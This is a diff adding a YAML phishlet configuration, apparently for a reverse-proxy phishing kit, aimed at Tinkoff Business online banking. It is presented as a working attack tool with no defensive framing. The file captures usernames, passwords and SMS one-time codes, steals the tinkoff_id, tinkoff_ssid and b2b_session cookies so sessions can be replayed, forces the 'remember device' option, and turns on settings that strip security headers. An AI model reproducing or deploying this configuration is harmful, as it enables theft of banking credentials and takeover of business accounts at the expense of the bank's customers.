@@ -1,0 +1,111 @@
+# Тинькофф Бизнес Phishlet
+# Конфигурация для перехвата Тинькофф Бизнес
+
+id: tinkoff_business
+author: PhantomSec Labs
+description: Тинькофф Бизнес - Online Banking Phishlet
+min_ver: 2.3.0
+
+proxy_hosts:
+  - phish_sub: www
+    orig_sub: www
+    domain: tinkoff.ru
+    session: true
+    is_landing: true
+
+  - phish_sub: business
+    orig_sub: business
+    domain: tinkoff.ru
+    session: true
+    is_landing: false
+
+sub_filters:
+  - triggers_on: www.tinkoff.ru
+    orig_sub: www
+    domain: tinkoff.ru
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+    redirect_only: false
+
+auth_tokens:
+  - domain: '.tinkoff.ru'
+    keys:
+      - 'tinkoff_id'
+      - 'tinkoff_ssid'
+      - 'b2b_session'
+
+credentials:
+  username:
+    key: 'username'
+    search: '<input.*?name=["\']username["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '<input.*?name=["\']password["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  custom:
+    - key: 'sms_code'
+      search: '<input.*?name=["\']smsCode["\'].*?value=["\']([^"\']*)["\']'
+      type: 'post'
+
+auth_urls:
+  - '/business/'
+  - '/auth/'
+  - '/business/login'
+
+login:
+  domain: 'www.tinkoff.ru'
+  path: '/business/'
+  method: 'GET'
+  parameters: []
+
+js_inject:
+  - triggers_on: 'www.tinkoff.ru'
+    js: |
+      // Remove Tinkoff branding
+      var logos = document.querySelectorAll('.tinkoff-logo');
+      logos.forEach(function(logo) { logo.style.display = 'none'; });
+
+force_post:
+  - path: '/auth/login'
+    search:
+      - key: 'username'
+        value: '.*'
+      - key: 'password'
+        value: '.*'
+    force:
+      - key: 'rememberDevice'
+        value: 'true'
+    type: 'post'
+
+# 2FA/MFA Bypass
+mfa_bypass:
+  enabled: true
+  methods:
+    - name: 'SMS'
+      trigger: 'sms'
+      capture_field: 'smsCode'
+
+# Session hijacking
+session_hijack:
+  enabled: true
+  cookie_names:
+    - 'tinkoff_id'
+    - 'tinkoff_ssid'
+  replay_delay: 1000
+
+# Redirect
+redirect:
+  enabled: true
+  url: 'https://www.tinkoff.ru/business/'
+  delay: 2000
+
+# Anti-detection
+anti_detection:
+  remove_security_headers: true
+  fake_cert_transparency: true
